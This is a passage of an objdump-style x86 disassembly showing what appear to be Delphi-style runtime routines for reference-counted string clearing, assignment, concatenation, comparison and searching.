  4036b6:	80 7b 28 01          	cmpb   $0x1,0x28(%ebx)
  4036ba:	76 09                	jbe    0x4036c5
  4036bc:	83 3d 00 a0 40 00 00 	cmpl   $0x0,0x40a000
  4036c3:	74 23                	je     0x4036e8
  4036c5:	8b 7b 10             	mov    0x10(%ebx),%edi
  4036c8:	85 ff                	test   %edi,%edi
  4036ca:	74 1c                	je     0x4036e8
  4036cc:	8b c7                	mov    %edi,%eax
  4036ce:	e8 4d 10 00 00       	call   0x404720
  4036d3:	8b 6b 10             	mov    0x10(%ebx),%ebp
  4036d6:	8b 75 10             	mov    0x10(%ebp),%esi
  4036d9:	3b 75 04             	cmp    0x4(%ebp),%esi
  4036dc:	74 0a                	je     0x4036e8
  4036de:	85 f6                	test   %esi,%esi
  4036e0:	74 06                	je     0x4036e8
  4036e2:	56                   	push   %esi
  4036e3:	e8 b8 d9 ff ff       	call   0x4010a0
  4036e8:	e8 0b fd ff ff       	call   0x4033f8
  4036ed:	80 7b 28 01          	cmpb   $0x1,0x28(%ebx)
  4036f1:	75 03                	jne    0x4036f6
  4036f3:	ff 53 24             	call   *0x24(%ebx)
  4036f6:	80 7b 28 00          	cmpb   $0x0,0x28(%ebx)
  4036fa:	74 05                	je     0x403701
  4036fc:	e8 9b fe ff ff       	call   0x40359c
  403701:	83 3b 00             	cmpl   $0x0,(%ebx)
  403704:	75 1a                	jne    0x403720
  403706:	83 3d 18 b0 40 00 00 	cmpl   $0x0,0x40b018
  40370d:	74 06                	je     0x403715
  40370f:	ff 15 18 b0 40 00    	call   *0x40b018
  403715:	a1 00 a0 40 00       	mov    0x40a000,%eax
  40371a:	50                   	push   %eax
  40371b:	e8 70 d9 ff ff       	call   0x401090
  403720:	8b 03                	mov    (%ebx),%eax
  403722:	8b f0                	mov    %eax,%esi
  403724:	8b fb                	mov    %ebx,%edi
  403726:	b9 0b 00 00 00       	mov    $0xb,%ecx
  40372b:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40372d:	e9 6b ff ff ff       	jmp    0x40369d
  403732:	5a                   	pop    %edx
  403733:	5d                   	pop    %ebp
  403734:	5f                   	pop    %edi
  403735:	5e                   	pop    %esi
  403736:	5b                   	pop    %ebx
  403737:	c3                   	ret
  403738:	a3 00 a0 40 00       	mov    %eax,0x40a000
  40373d:	e8 16 ff ff ff       	call   0x403658
  403742:	c3                   	ret
  403743:	90                   	nop
  403744:	8f 05 04 a0 40 00    	pop    0x40a004
  40374a:	e9 e9 ff ff ff       	jmp    0x403738
  40374f:	c3                   	ret
  403750:	8b 10                	mov    (%eax),%edx
  403752:	85 d2                	test   %edx,%edx
  403754:	74 1c                	je     0x403772
  403756:	c7 00 00 00 00 00    	movl   $0x0,(%eax)
  40375c:	8b 4a f8             	mov    -0x8(%edx),%ecx
  40375f:	49                   	dec    %ecx
  403760:	7c 10                	jl     0x403772
  403762:	f0 ff 4a f8          	lock decl -0x8(%edx)
  403766:	75 0a                	jne    0x403772
  403768:	50                   	push   %eax
  403769:	8d 42 f8             	lea    -0x8(%edx),%eax
  40376c:	e8 eb f0 ff ff       	call   0x40285c
  403771:	58                   	pop    %eax
  403772:	c3                   	ret
  403773:	90                   	nop
  403774:	53                   	push   %ebx
  403775:	56                   	push   %esi
  403776:	89 c3                	mov    %eax,%ebx
  403778:	89 d6                	mov    %edx,%esi
  40377a:	8b 13                	mov    (%ebx),%edx
  40377c:	85 d2                	test   %edx,%edx
  40377e:	74 1a                	je     0x40379a
  403780:	c7 03 00 00 00 00    	movl   $0x0,(%ebx)
  403786:	8b 4a f8             	mov    -0x8(%edx),%ecx
  403789:	49                   	dec    %ecx
  40378a:	7c 0e                	jl     0x40379a
  40378c:	f0 ff 4a f8          	lock decl -0x8(%edx)
  403790:	75 08                	jne    0x40379a
  403792:	8d 42 f8             	lea    -0x8(%edx),%eax
  403795:	e8 c2 f0 ff ff       	call   0x40285c
  40379a:	83 c3 04             	add    $0x4,%ebx
  40379d:	4e                   	dec    %esi
  40379e:	75 da                	jne    0x40377a
  4037a0:	5e                   	pop    %esi
  4037a1:	5b                   	pop    %ebx
  4037a2:	c3                   	ret
  4037a3:	90                   	nop
  4037a4:	85 d2                	test   %edx,%edx
  4037a6:	74 24                	je     0x4037cc
  4037a8:	8b 4a f8             	mov    -0x8(%edx),%ecx
  4037ab:	41                   	inc    %ecx
  4037ac:	7f 1a                	jg     0x4037c8
  4037ae:	50                   	push   %eax
  4037af:	52                   	push   %edx
  4037b0:	8b 42 fc             	mov    -0x4(%edx),%eax
  4037b3:	e8 5c 00 00 00       	call   0x403814
  4037b8:	89 c2                	mov    %eax,%edx
  4037ba:	58                   	pop    %eax
  4037bb:	52                   	push   %edx
  4037bc:	8b 48 fc             	mov    -0x4(%eax),%ecx
  4037bf:	e8 7c f1 ff ff       	call   0x402940
  4037c4:	5a                   	pop    %edx
  4037c5:	58                   	pop    %eax
  4037c6:	eb 04                	jmp    0x4037cc
  4037c8:	f0 ff 42 f8          	lock incl -0x8(%edx)
  4037cc:	87 10                	xchg   %edx,(%eax)
  4037ce:	85 d2                	test   %edx,%edx
  4037d0:	74 14                	je     0x4037e6
  4037d2:	8b 4a f8             	mov    -0x8(%edx),%ecx
  4037d5:	49                   	dec    %ecx
  4037d6:	7c 0e                	jl     0x4037e6
  4037d8:	f0 ff 4a f8          	lock decl -0x8(%edx)
  4037dc:	75 08                	jne    0x4037e6
  4037de:	8d 42 f8             	lea    -0x8(%edx),%eax
  4037e1:	e8 76 f0 ff ff       	call   0x40285c
  4037e6:	c3                   	ret
  4037e7:	90                   	nop
  4037e8:	85 d2                	test   %edx,%edx
  4037ea:	74 0a                	je     0x4037f6
  4037ec:	8b 4a f8             	mov    -0x8(%edx),%ecx
  4037ef:	41                   	inc    %ecx
  4037f0:	7e 04                	jle    0x4037f6
  4037f2:	f0 ff 42 f8          	lock incl -0x8(%edx)
  4037f6:	87 10                	xchg   %edx,(%eax)
  4037f8:	85 d2                	test   %edx,%edx
  4037fa:	74 14                	je     0x403810
  4037fc:	8b 4a f8             	mov    -0x8(%edx),%ecx
  4037ff:	49                   	dec    %ecx
  403800:	7c 0e                	jl     0x403810
  403802:	f0 ff 4a f8          	lock decl -0x8(%edx)
  403806:	75 08                	jne    0x403810
  403808:	8d 42 f8             	lea    -0x8(%edx),%eax
  40380b:	e8 4c f0 ff ff       	call   0x40285c
  403810:	c3                   	ret
  403811:	8d 40 00             	lea    0x0(%eax),%eax
  403814:	85 c0                	test   %eax,%eax
  403816:	7e 24                	jle    0x40383c
  403818:	50                   	push   %eax
  403819:	83 c0 0a             	add    $0xa,%eax
  40381c:	83 e0 fe             	and    $0xfffffffe,%eax
  40381f:	50                   	push   %eax
  403820:	e8 07 f0 ff ff       	call   0x40282c
  403825:	5a                   	pop    %edx
  403826:	66 c7 44 02 fe 00 00 	movw   $0x0,-0x2(%edx,%eax,1)
  40382d:	83 c0 08             	add    $0x8,%eax
  403830:	5a                   	pop    %edx
  403831:	89 50 fc             	mov    %edx,-0x4(%eax)
  403834:	c7 40 f8 01 00 00 00 	movl   $0x1,-0x8(%eax)
  40383b:	c3                   	ret
  40383c:	31 c0                	xor    %eax,%eax
  40383e:	c3                   	ret
  40383f:	90                   	nop
  403840:	53                   	push   %ebx
  403841:	56                   	push   %esi
  403842:	57                   	push   %edi
  403843:	89 c3                	mov    %eax,%ebx
  403845:	89 d6                	mov    %edx,%esi
  403847:	89 cf                	mov    %ecx,%edi
  403849:	89 f8                	mov    %edi,%eax
  40384b:	e8 c4 ff ff ff       	call   0x403814
  403850:	89 f9                	mov    %edi,%ecx
  403852:	89 c7                	mov    %eax,%edi
  403854:	85 f6                	test   %esi,%esi
  403856:	74 09                	je     0x403861
  403858:	89 c2                	mov    %eax,%edx
  40385a:	89 f0                	mov    %esi,%eax
  40385c:	e8 df f0 ff ff       	call   0x402940
  403861:	89 d8                	mov    %ebx,%eax
  403863:	e8 e8 fe ff ff       	call   0x403750
  403868:	89 3b                	mov    %edi,(%ebx)
  40386a:	5f                   	pop    %edi
  40386b:	5e                   	pop    %esi
  40386c:	5b                   	pop    %ebx
  40386d:	c3                   	ret
  40386e:	8b c0                	mov    %eax,%eax
  403870:	31 c9                	xor    %ecx,%ecx
  403872:	85 d2                	test   %edx,%edx
  403874:	74 21                	je     0x403897
  403876:	52                   	push   %edx
  403877:	3a 0a                	cmp    (%edx),%cl
  403879:	74 17                	je     0x403892
  40387b:	3a 4a 01             	cmp    0x1(%edx),%cl
  40387e:	74 11                	je     0x403891
  403880:	3a 4a 02             	cmp    0x2(%edx),%cl
  403883:	74 0b                	je     0x403890
  403885:	3a 4a 03             	cmp    0x3(%edx),%cl
  403888:	74 05                	je     0x40388f
  40388a:	83 c2 04             	add    $0x4,%edx
  40388d:	eb e8                	jmp    0x403877
  40388f:	42                   	inc    %edx
  403890:	42                   	inc    %edx
  403891:	42                   	inc    %edx
  403892:	89 d1                	mov    %edx,%ecx
  403894:	5a                   	pop    %edx
  403895:	29 d1                	sub    %edx,%ecx
  403897:	e9 a4 ff ff ff       	jmp    0x403840
  40389c:	c3                   	ret
  40389d:	8d 40 00             	lea    0x0(%eax),%eax
  4038a0:	31 c9                	xor    %ecx,%ecx
  4038a2:	8a 0a                	mov    (%edx),%cl
  4038a4:	42                   	inc    %edx
  4038a5:	e9 96 ff ff ff       	jmp    0x403840
  4038aa:	c3                   	ret
  4038ab:	90                   	nop
  4038ac:	57                   	push   %edi
  4038ad:	50                   	push   %eax
  4038ae:	51                   	push   %ecx
  4038af:	89 d7                	mov    %edx,%edi
  4038b1:	31 c0                	xor    %eax,%eax
  4038b3:	f2 ae                	repnz scas %es:(%edi),%al
  4038b5:	75 02                	jne    0x4038b9
  4038b7:	f7 d1                	not    %ecx
  4038b9:	58                   	pop    %eax
  4038ba:	01 c1                	add    %eax,%ecx
  4038bc:	58                   	pop    %eax
  4038bd:	5f                   	pop    %edi
  4038be:	e9 7d ff ff ff       	jmp    0x403840
  4038c3:	c3                   	ret
  4038c4:	85 c0                	test   %eax,%eax
  4038c6:	74 03                	je     0x4038cb
  4038c8:	8b 40 fc             	mov    -0x4(%eax),%eax
  4038cb:	c3                   	ret
  4038cc:	85 d2                	test   %edx,%edx
  4038ce:	74 3f                	je     0x40390f
  4038d0:	8b 08                	mov    (%eax),%ecx
  4038d2:	85 c9                	test   %ecx,%ecx
  4038d4:	0f 84 ca fe ff ff    	je     0x4037a4
  4038da:	53                   	push   %ebx
  4038db:	56                   	push   %esi
  4038dc:	57                   	push   %edi
  4038dd:	89 c3                	mov    %eax,%ebx
  4038df:	89 d6                	mov    %edx,%esi
  4038e1:	8b 79 fc             	mov    -0x4(%ecx),%edi
  4038e4:	8b 56 fc             	mov    -0x4(%esi),%edx
  4038e7:	01 fa                	add    %edi,%edx
  4038e9:	39 ce                	cmp    %ecx,%esi
  4038eb:	74 17                	je     0x403904
  4038ed:	e8 02 03 00 00       	call   0x403bf4
  4038f2:	89 f0                	mov    %esi,%eax
  4038f4:	8b 4e fc             	mov    -0x4(%esi),%ecx
  4038f7:	8b 13                	mov    (%ebx),%edx
  4038f9:	01 fa                	add    %edi,%edx
  4038fb:	e8 40 f0 ff ff       	call   0x402940
  403900:	5f                   	pop    %edi
  403901:	5e                   	pop    %esi
  403902:	5b                   	pop    %ebx
  403903:	c3                   	ret
  403904:	e8 eb 02 00 00       	call   0x403bf4
  403909:	8b 03                	mov    (%ebx),%eax
  40390b:	89 f9                	mov    %edi,%ecx
  40390d:	eb e8                	jmp    0x4038f7
  40390f:	c3                   	ret
  403910:	85 d2                	test   %edx,%edx
  403912:	74 61                	je     0x403975
  403914:	85 c9                	test   %ecx,%ecx
  403916:	0f 84 88 fe ff ff    	je     0x4037a4
  40391c:	3b 10                	cmp    (%eax),%edx
  40391e:	74 5c                	je     0x40397c
  403920:	3b 08                	cmp    (%eax),%ecx
  403922:	74 0e                	je     0x403932
  403924:	50                   	push   %eax
  403925:	51                   	push   %ecx
  403926:	e8 79 fe ff ff       	call   0x4037a4
  40392b:	5a                   	pop    %edx
  40392c:	58                   	pop    %eax
  40392d:	e9 9a ff ff ff       	jmp    0x4038cc
  403932:	53                   	push   %ebx
  403933:	56                   	push   %esi
  403934:	57                   	push   %edi
  403935:	89 d3                	mov    %edx,%ebx
  403937:	89 ce                	mov    %ecx,%esi
  403939:	50                   	push   %eax
  40393a:	8b 43 fc             	mov    -0x4(%ebx),%eax
  40393d:	03 46 fc             	add    -0x4(%esi),%eax
  403940:	e8 cf fe ff ff       	call   0x403814
  403945:	89 c7                	mov    %eax,%edi
  403947:	89 c2                	mov    %eax,%edx
  403949:	89 d8                	mov    %ebx,%eax
  40394b:	8b 4b fc             	mov    -0x4(%ebx),%ecx
  40394e:	e8 ed ef ff ff       	call   0x402940
  403953:	89 fa                	mov    %edi,%edx
  403955:	89 f0                	mov    %esi,%eax
  403957:	8b 4e fc             	mov    -0x4(%esi),%ecx
  40395a:	03 53 fc             	add    -0x4(%ebx),%edx
  40395d:	e8 de ef ff ff       	call   0x402940
  403962:	58                   	pop    %eax
  403963:	89 fa                	mov    %edi,%edx
  403965:	85 ff                	test   %edi,%edi
  403967:	74 03                	je     0x40396c
  403969:	ff 4f f8             	decl   -0x8(%edi)
  40396c:	e8 33 fe ff ff       	call   0x4037a4
  403971:	5f                   	pop    %edi
  403972:	5e                   	pop    %esi
  403973:	5b                   	pop    %ebx
  403974:	c3                   	ret
  403975:	89 ca                	mov    %ecx,%edx
  403977:	e9 28 fe ff ff       	jmp    0x4037a4
  40397c:	89 ca                	mov    %ecx,%edx
  40397e:	e9 49 ff ff ff       	jmp    0x4038cc
  403983:	c3                   	ret
  403984:	53                   	push   %ebx
  403985:	56                   	push   %esi
  403986:	57                   	push   %edi
  403987:	52                   	push   %edx
  403988:	50                   	push   %eax
  403989:	89 d3                	mov    %edx,%ebx
  40398b:	31 ff                	xor    %edi,%edi
  40398d:	8b 4c 94 14          	mov    0x14(%esp,%edx,4),%ecx
  403991:	85 c9                	test   %ecx,%ecx
  403993:	74 0c                	je     0x4039a1
  403995:	39 08                	cmp    %ecx,(%eax)
  403997:	75 08                	jne    0x4039a1
  403999:	89 cf                	mov    %ecx,%edi
  40399b:	8b 41 fc             	mov    -0x4(%ecx),%eax
  40399e:	4a                   	dec    %edx
  40399f:	eb 02                	jmp    0x4039a3
  4039a1:	31 c0                	xor    %eax,%eax
  4039a3:	8b 4c 94 14          	mov    0x14(%esp,%edx,4),%ecx
  4039a7:	85 c9                	test   %ecx,%ecx
  4039a9:	74 09                	je     0x4039b4
  4039ab:	03 41 fc             	add    -0x4(%ecx),%eax
  4039ae:	39 cf                	cmp    %ecx,%edi
  4039b0:	75 02                	jne    0x4039b4
  4039b2:	31 ff                	xor    %edi,%edi
  4039b4:	4a                   	dec    %edx
  4039b5:	75 ec                	jne    0x4039a3
  4039b7:	85 ff                	test   %edi,%edi
  4039b9:	74 17                	je     0x4039d2
  4039bb:	89 c2                	mov    %eax,%edx
  4039bd:	8b 04 24             	mov    (%esp),%eax
  4039c0:	8b 77 fc             	mov    -0x4(%edi),%esi
  4039c3:	e8 2c 02 00 00       	call   0x403bf4
  4039c8:	8b 3c 24             	mov    (%esp),%edi
  4039cb:	ff 37                	push   (%edi)
  4039cd:	03 37                	add    (%edi),%esi
  4039cf:	4b                   	dec    %ebx
  4039d0:	eb 08                	jmp    0x4039da
  4039d2:	e8 3d fe ff ff       	call   0x403814
  4039d7:	50                   	push   %eax
  4039d8:	89 c6                	mov    %eax,%esi
  4039da:	8b 44 9c 18          	mov    0x18(%esp,%ebx,4),%eax
  4039de:	89 f2                	mov    %esi,%edx
  4039e0:	85 c0                	test   %eax,%eax
  4039e2:	74 0a                	je     0x4039ee
  4039e4:	8b 48 fc             	mov    -0x4(%eax),%ecx
  4039e7:	01 ce                	add    %ecx,%esi
  4039e9:	e8 52 ef ff ff       	call   0x402940
  4039ee:	4b                   	dec    %ebx
  4039ef:	75 e9                	jne    0x4039da
  4039f1:	5a                   	pop    %edx
  4039f2:	58                   	pop    %eax
  4039f3:	85 ff                	test   %edi,%edi
  4039f5:	75 0c                	jne    0x403a03
  4039f7:	85 d2                	test   %edx,%edx
  4039f9:	74 03                	je     0x4039fe
  4039fb:	ff 4a f8             	decl   -0x8(%edx)
  4039fe:	e8 a1 fd ff ff       	call   0x4037a4
  403a03:	5a                   	pop    %edx
  403a04:	5f                   	pop    %edi
  403a05:	5e                   	pop    %esi
  403a06:	5b                   	pop    %ebx
  403a07:	58                   	pop    %eax
  403a08:	8d 24 94             	lea    (%esp,%edx,4),%esp
  403a0b:	ff e0                	jmp    *%eax
  403a0d:	c3                   	ret
  403a0e:	8b c0                	mov    %eax,%eax
  403a10:	53                   	push   %ebx
  403a11:	56                   	push   %esi
  403a12:	57                   	push   %edi
  403a13:	89 c6                	mov    %eax,%esi
  403a15:	89 d7                	mov    %edx,%edi
  403a17:	39 d0                	cmp    %edx,%eax
  403a19:	0f 84 8f 00 00 00    	je     0x403aae
  403a1f:	85 f6                	test   %esi,%esi
  403a21:	74 68                	je     0x403a8b
  403a23:	85 ff                	test   %edi,%edi
  403a25:	74 6b                	je     0x403a92
  403a27:	8b 46 fc             	mov    -0x4(%esi),%eax
  403a2a:	8b 57 fc             	mov    -0x4(%edi),%edx
  403a2d:	29 d0                	sub    %edx,%eax
  403a2f:	77 02                	ja     0x403a33
  403a31:	01 c2                	add    %eax,%edx
  403a33:	52                   	push   %edx
  403a34:	c1 ea 02             	shr    $0x2,%edx
  403a37:	74 26                	je     0x403a5f
  403a39:	8b 0e                	mov    (%esi),%ecx
  403a3b:	8b 1f                	mov    (%edi),%ebx
  403a3d:	39 d9                	cmp    %ebx,%ecx
  403a3f:	75 58                	jne    0x403a99
  403a41:	4a                   	dec    %edx
  403a42:	74 15                	je     0x403a59
  403a44:	8b 4e 04             	mov    0x4(%esi),%ecx
  403a47:	8b 5f 04             	mov    0x4(%edi),%ebx
  403a4a:	39 d9                	cmp    %ebx,%ecx
  403a4c:	75 4b                	jne    0x403a99
  403a4e:	83 c6 08             	add    $0x8,%esi
  403a51:	83 c7 08             	add    $0x8,%edi
  403a54:	4a                   	dec    %edx
  403a55:	75 e2                	jne    0x403a39
  403a57:	eb 06                	jmp    0x403a5f
  403a59:	83 c6 04             	add    $0x4,%esi
  403a5c:	83 c7 04             	add    $0x4,%edi
  403a5f:	5a                   	pop    %edx
  403a60:	83 e2 03             	and    $0x3,%edx
  403a63:	74 22                	je     0x403a87
  403a65:	8b 0e                	mov    (%esi),%ecx
  403a67:	8b 1f                	mov    (%edi),%ebx
  403a69:	38 d9                	cmp    %bl,%cl
  403a6b:	75 41                	jne    0x403aae
  403a6d:	4a                   	dec    %edx
  403a6e:	74 17                	je     0x403a87
  403a70:	38 fd                	cmp    %bh,%ch
  403a72:	75 3a                	jne    0x403aae
  403a74:	4a                   	dec    %edx
  403a75:	74 10                	je     0x403a87
  403a77:	81 e3 00 00 ff 00    	and    $0xff0000,%ebx
  403a7d:	81 e1 00 00 ff 00    	and    $0xff0000,%ecx
  403a83:	39 d9                	cmp    %ebx,%ecx
  403a85:	75 27                	jne    0x403aae
  403a87:	01 c0                	add    %eax,%eax
  403a89:	eb 23                	jmp    0x403aae
  403a8b:	8b 57 fc             	mov    -0x4(%edi),%edx
  403a8e:	29 d0                	sub    %edx,%eax
  403a90:	eb 1c                	jmp    0x403aae
  403a92:	8b 46 fc             	mov    -0x4(%esi),%eax
  403a95:	29 d0                	sub    %edx,%eax
  403a97:	eb 15                	jmp    0x403aae
  403a99:	5a                   	pop    %edx
  403a9a:	38 d9                	cmp    %bl,%cl
  403a9c:	75 10                	jne    0x403aae
  403a9e:	38 fd                	cmp    %bh,%ch
  403aa0:	75 0c                	jne    0x403aae
  403aa2:	c1 e9 10             	shr    $0x10,%ecx
  403aa5:	c1 eb 10             	shr    $0x10,%ebx
  403aa8:	38 d9                	cmp    %bl,%cl
  403aaa:	75 02                	jne    0x403aae
  403aac:	38 fd                	cmp    %bh,%ch
  403aae:	5f                   	pop    %edi
  403aaf:	5e                   	pop    %esi
  403ab0:	5b                   	pop    %ebx
  403ab1:	c3                   	ret
  403ab2:	8b c0                	mov    %eax,%eax
  403ab4:	85 c0                	test   %eax,%eax
  403ab6:	74 0a                	je     0x403ac2
  403ab8:	8b 50 f8             	mov    -0x8(%eax),%edx
  403abb:	42                   	inc    %edx
  403abc:	7e 04                	jle    0x403ac2
  403abe:	f0 ff 40 f8          	lock incl -0x8(%eax)
  403ac2:	c3                   	ret
  403ac3:	90                   	nop
  403ac4:	85 c0                	test   %eax,%eax
  403ac6:	74 02                	je     0x403aca
  403ac8:	c3                   	ret
  403ac9:	00 b8 c9 3a 40 00    	add    %bh,0x403ac9(%eax)
  403acf:	c3                   	ret
  403ad0:	8b 10                	mov    (%eax),%edx
  403ad2:	85 d2                	test   %edx,%edx
  403ad4:	74 38                	je     0x403b0e
  403ad6:	8b 4a f8             	mov    -0x8(%edx),%ecx
  403ad9:	49                   	dec    %ecx
  403ada:	74 32                	je     0x403b0e
  403adc:	53                   	push   %ebx
  403add:	89 c3                	mov    %eax,%ebx
  403adf:	8b 42 fc             	mov    -0x4(%edx),%eax
  403ae2:	e8 2d fd ff ff       	call   0x403814
  403ae7:	89 c2                	mov    %eax,%edx
  403ae9:	8b 03                	mov    (%ebx),%eax
  403aeb:	89 13                	mov    %edx,(%ebx)
  403aed:	50                   	push   %eax
  403aee:	8b 48 fc             	mov    -0x4(%eax),%ecx
  403af1:	e8 4a ee ff ff       	call   0x402940
  403af6:	58                   	pop    %eax
  403af7:	8b 48 f8             	mov    -0x8(%eax),%ecx
  403afa:	49                   	dec    %ecx
  403afb:	7c 0e                	jl     0x403b0b
  403afd:	f0 ff 48 f8          	lock decl -0x8(%eax)
  403b01:	75 08                	jne    0x403b0b
  403b03:	8d 40 f8             	lea    -0x8(%eax),%eax
  403b06:	e8 51 ed ff ff       	call   0x40285c
  403b0b:	8b 13                	mov    (%ebx),%edx
  403b0d:	5b                   	pop    %ebx
  403b0e:	89 d0                	mov    %edx,%eax
  403b10:	c3                   	ret
  403b11:	8d 40 00             	lea    0x0(%eax),%eax
  403b14:	e9 b7 ff ff ff       	jmp    0x403ad0
  403b19:	c3                   	ret
  403b1a:	8b c0                	mov    %eax,%eax
  403b1c:	e9 af ff ff ff       	jmp    0x403ad0
  403b21:	c3                   	ret
  403b22:	8b c0                	mov    %eax,%eax
  403b24:	53                   	push   %ebx
  403b25:	85 c0                	test   %eax,%eax
  403b27:	74 2d                	je     0x403b56
  403b29:	8b 58 fc             	mov    -0x4(%eax),%ebx
  403b2c:	85 db                	test   %ebx,%ebx
  403b2e:	74 26                	je     0x403b56
  403b30:	4a                   	dec    %edx
  403b31:	7c 1b                	jl     0x403b4e
  403b33:	39 da                	cmp    %ebx,%edx
  403b35:	7d 1f                	jge    0x403b56
  403b37:	29 d3                	sub    %edx,%ebx
  403b39:	85 c9                	test   %ecx,%ecx
  403b3b:	7c 19                	jl     0x403b56
  403b3d:	39 d9                	cmp    %ebx,%ecx
  403b3f:	7f 11                	jg     0x403b52
  403b41:	01 c2                	add    %eax,%edx
  403b43:	8b 44 24 08          	mov    0x8(%esp),%eax
  403b47:	e8 f4 fc ff ff       	call   0x403840
  403b4c:	eb 11                	jmp    0x403b5f
  403b4e:	31 d2                	xor    %edx,%edx
  403b50:	eb e5                	jmp    0x403b37
  403b52:	89 d9                	mov    %ebx,%ecx
  403b54:	eb eb                	jmp    0x403b41
  403b56:	8b 44 24 08          	mov    0x8(%esp),%eax
  403b5a:	e8 f1 fb ff ff       	call   0x403750
  403b5f:	5b                   	pop    %ebx
  403b60:	c2 04 00             	ret    $0x4
  403b63:	c3                   	ret
  403b64:	53                   	push   %ebx
  403b65:	56                   	push   %esi
  403b66:	57                   	push   %edi
  403b67:	89 c3                	mov    %eax,%ebx
  403b69:	89 d6                	mov    %edx,%esi
  403b6b:	89 cf                	mov    %ecx,%edi
  403b6d:	e8 a2 ff ff ff       	call   0x403b14
  403b72:	8b 13                	mov    (%ebx),%edx
  403b74:	85 d2                	test   %edx,%edx
  403b76:	74 30                	je     0x403ba8
  403b78:	8b 4a fc             	mov    -0x4(%edx),%ecx
  403b7b:	4e                   	dec    %esi
  403b7c:	7c 2a                	jl     0x403ba8
  403b7e:	39 ce                	cmp    %ecx,%esi
  403b80:	7d 26                	jge    0x403ba8
  403b82:	85 ff                	test   %edi,%edi
  403b84:	7e 22                	jle    0x403ba8
  403b86:	29 f1                	sub    %esi,%ecx
  403b88:	39 cf                	cmp    %ecx,%edi
  403b8a:	7e 02                	jle    0x403b8e
  403b8c:	89 cf                	mov    %ecx,%edi
  403b8e:	29 f9                	sub    %edi,%ecx
  403b90:	01 f2                	add    %esi,%edx
  403b92:	8d 04 17             	lea    (%edi,%edx,1),%eax
  403b95:	e8 a6 ed ff ff       	call   0x402940
  403b9a:	8b 13                	mov    (%ebx),%edx
  403b9c:	89 d8                	mov    %ebx,%eax
  403b9e:	8b 52 fc             	mov    -0x4(%edx),%edx
  403ba1:	29 fa                	sub    %edi,%edx
  403ba3:	e8 4c 00 00 00       	call   0x403bf4
  403ba8:	5f                   	pop    %edi
  403ba9:	5e                   	pop    %esi
  403baa:	5b                   	pop    %ebx
  403bab:	c3                   	ret
  403bac:	85 c0                	test   %eax,%eax
  403bae:	74 40                	je     0x403bf0
  403bb0:	85 d2                	test   %edx,%edx
  403bb2:	74 31                	je     0x403be5
  403bb4:	53                   	push   %ebx
  403bb5:	56                   	push   %esi
  403bb6:	57                   	push   %edi
  403bb7:	89 c6                	mov    %eax,%esi
  403bb9:	89 d7                	mov    %edx,%edi
  403bbb:	8b 4f fc             	mov    -0x4(%edi),%ecx
  403bbe:	57                   	push   %edi
  403bbf:	8b 56 fc             	mov    -0x4(%esi),%edx
  403bc2:	4a                   	dec    %edx
  403bc3:	78 1b                	js     0x403be0
  403bc5:	8a 06                	mov    (%esi),%al
  403bc7:	46                   	inc    %esi
  403bc8:	29 d1                	sub    %edx,%ecx
  403bca:	7e 14                	jle    0x403be0
  403bcc:	f2 ae                	repnz scas %es:(%edi),%al
  403bce:	75 10                	jne    0x403be0
  403bd0:	89 cb                	mov    %ecx,%ebx
  403bd2:	56                   	push   %esi
  403bd3:	57                   	push   %edi
  403bd4:	89 d1                	mov    %edx,%ecx
  403bd6:	f3 a6                	repz cmpsb %es:(%edi),%ds:(%esi)
  403bd8:	5f                   	pop    %edi
  403bd9:	5e                   	pop    %esi
  403bda:	74 0c                	je     0x403be8
  403bdc:	89 d9                	mov    %ebx,%ecx
  403bde:	eb ec                	jmp    0x403bcc
  403be0:	5a                   	pop    %edx
  403be1:	31 c0                	xor    %eax,%eax
  403be3:	eb 08                	jmp    0x403bed
  403be5:	31 c0                	xor    %eax,%eax
  403be7:	c3                   	ret
  403be8:	5a                   	pop    %edx
  403be9:	89 f8                	mov    %edi,%eax
  403beb:	29 d0                	sub    %edx,%eax
  403bed:	5f                   	pop    %edi
  403bee:	5e                   	pop    %esi
  403bef:	5b                   	pop    %ebx
  403bf0:	c3                   	ret
  403bf1:	8d 40 00             	lea    0x0(%eax),%eax
  403bf4:	53                   	push   %ebx
  403bf5:	56                   	push   %esi
  403bf6:	57                   	push   %edi
  403bf7:	89 c3                	mov    %eax,%ebx
  403bf9:	89 d6                	mov    %edx,%esi
  403bfb:	31 ff                	xor    %edi,%edi
  403bfd:	85 d2                	test   %edx,%edx
  403bff:	7e 48                	jle    0x403c49
  403c01:	8b 03                	mov    (%ebx),%eax
  403c03:	85 c0                	test   %eax,%eax
  403c05:	74 23                	je     0x403c2a
  403c07:	83 78 f8 01          	cmpl   $0x1,-0x8(%eax)
  403c0b:	75 1d                	jne    0x403c2a
  403c0d:	83 e8 08             	sub    $0x8,%eax
  403c10:	83 c2 09             	add    $0x9,%edx
  403c13:	50                   	push   %eax
  403c14:	89 e0                	mov    %esp,%eax
  403c16:	e8 61 ec ff ff       	call   0x40287c
  403c1b:	58                   	pop    %eax
  403c1c:	83 c0 08             	add    $0x8,%eax
  403c1f:	89 03                	mov    %eax,(%ebx)
  403c21:	89 70 fc             	mov    %esi,-0x4(%eax)
  403c24:	c6 04 06 00          	movb   $0x0,(%esi,%eax,1)
  403c28:	eb 28                	jmp    0x403c52
  403c2a:	89 d0                	mov    %edx,%eax
  403c2c:	e8 e3 fb ff ff       	call   0x403814
  403c31:	89 c7                	mov    %eax,%edi
  403c33:	8b 03                	mov    (%ebx),%eax
  403c35:	85 c0                	test   %eax,%eax
  403c37:	74 10                	je     0x403c49
  403c39:	89 fa                	mov    %edi,%edx
  403c3b:	8b 48 fc             	mov    -0x4(%eax),%ecx
  403c3e:	39 f1                	cmp    %esi,%ecx
  403c40:	7c 02                	jl     0x403c44
  403c42:	89 f1                	mov    %esi,%ecx
  403c44:	e8 f7 ec ff ff       	call   0x402940
  403c49:	89 d8                	mov    %ebx,%eax
  403c4b:	e8 00 fb ff ff       	call   0x403750
  403c50:	89 3b                	mov    %edi,(%ebx)
  403c52:	5f                   	pop    %edi
  403c53:	5e                   	pop    %esi
  403c54:	5b                   	pop    %ebx
  403c55:	c3                   	ret
  403c56:	8b c0                	mov    %eax,%eax
  403c58:	b0 01                	mov    $0x1,%al
  403c5a:	e9 c5 ec ff ff       	jmp    0x402924
  403c5f:	c3                   	ret
  403c60:	8b 10                	mov    (%eax),%edx
  403c62:	85 d2                	test   %edx,%edx
  403c64:	74 0e                	je     0x403c74
  403c66:	c7 00 00 00 00 00    	movl   $0x0,(%eax)
  403c6c:	50                   	push   %eax
  403c6d:	52                   	push   %edx
  403c6e:	e8 85 d4 ff ff       	call   0x4010f8
